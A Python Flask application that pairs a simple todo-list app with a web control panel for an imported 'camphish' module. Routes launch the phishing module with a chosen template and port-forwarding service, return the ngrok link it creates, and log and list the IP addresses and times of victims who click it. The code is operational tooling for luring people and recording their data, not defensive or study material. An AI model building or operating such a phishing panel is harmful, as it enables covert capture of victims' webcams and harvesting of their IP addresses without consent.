#!/usr/bin/python
import time
import configparser
from flask import Flask, render_template, request, redirect, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
import camphish
import threading
import json

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

times = list( )

# Set up Config Parser
config = configparser.ConfigParser( )
config.read('app.cfg')


class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.String(200), nullable=False)
    date_created = db.Column(db.DateTime, default=datetime.now(timezone.utc))

    def __repr__(self):
        return '<Task %r' % self.id


@app.route('/')
def index():
    services = json.loads(open(config['PATHS']['ServicesPath'], "r").read( ))
    return render_template('index.html', services = services)



@app.route('/todo', methods=['POST', 'GET'])
def todo():
    if request.method == 'POST':
        task_content = request.form['content']
        new_task = Todo(content=task_content)
        try:
            db.session.add(new_task)
            db.session.commit( )
            return redirect('/todo')
        except:
            return 'There was an Issue adding your task to the database'

    else:
        tasks = Todo.query.order_by(Todo.date_created).all( )
        return render_template('todo.html', tasks=tasks)


@app.route('/delete/<int:id>')
def delete(id):
    task_to_delete = Todo.query.get_or_404(id)

    try:
        db.session.delete(task_to_delete)
        db.session.commit( )
        return redirect('/todo')
    except:
        return "There was a Problem deleting that Task"


@app.route('/update/<int:id>', methods=['GET', 'POST'])
def update(id):
    task = Todo.query.get_or_404(id)
    if request.method == 'POST':
        task.content = request.form['content']

        try:
            db.session.commit( )
            return redirect('/todo')
        except:
            return 'There was an issue updating your Task'
    else:
        return render_template('update.html', task=task)


@app.route('/CamPhish/', methods=['GET', 'POST'])
def camphish_create() -> str:
    if request.method == 'GET':
        return render_template('Camphish.html', ngrok_url=None)
    else:
        service = request.form.get('port_forwarding')
        template = request.form.get('template')
        auth = "test"
        # ngrok_url = camphish.camphish(int(service), int(template), autthoken=auth)
        global ngrok_url_thread
        ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(service), int(template), auth),
                                                  daemon=True)
        ngrok_url_thread.start( )

        print('FUNKTION GESTARTET')

        # print(service, template, ngrok_url)

        def check_connection():
            before_connections = list( )
            global times
            while True:
                if before_connections != camphish.output.connections:
                    before_connections = camphish.output.connections
                    print(f'{camphish.output.connections} | just clicked the Link.')
                    camphish.output.old_connections.append(camphish.output.connections[0])
                    times.append(datetime.now(timezone.utc))
                    camphish.output.connections.clear( )
                    time.sleep(2)
                else:
                    time.sleep(2)

        check_thread = threading.Thread(target=check_connection, daemon=True)
        check_thread.start( )
        while camphish.output.link is None:
            pass
        return render_template('Camphish.html', ngrok_url=camphish.output.link, ownSwitch=True)


@app.route('/ips', methods=['GET', 'POST'])
def return_ips():
    if request.method == 'GET':
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)
    elif request.method == 'POST':
        return jsonify(camphish.output.old_connections)
    else:
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)


@app.route('/stop_camphish', methods=['GET', 'POST'])
def stop_camphish():
    ngrok_url_thread.stop( )
    return redirect('/CamPhish')


@app.route('/get_link', methods=['POST'])
def process():
    # service = request.form['port_forwarding']
    service = request.form.get('service')
    # template = request.form['template']
    template = request.form.get('template')
    auth = 'AuthKey'

    global ngrok_url_thread

    ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(service), int(template), auth),
                                              daemon=True)
    ngrok_url_thread.start( )

    print('FUNKTION GESTARTET')

    def check_connection():
        before_connections = list( )
        global times
        while True:
            if before_connections != camphish.output.connections:
                before_connections = camphish.output.connections
                print(f'{camphish.output.connections} | just clicked the Link.')
                camphish.output.old_connections.append(camphish.output.connections[0])
                times.append(datetime.now(timezone.utc))
                camphish.output.connections.clear( )
                time.sleep(2)
            else:
                time.sleep(2)

    check_thread = threading.Thread(target=check_connection, daemon=True)
    check_thread.start( )
    while camphish.output.link is None:
        pass
    return camphish.output.link


if __name__ == '__main__':
    app.run(host='0.0.0.0')
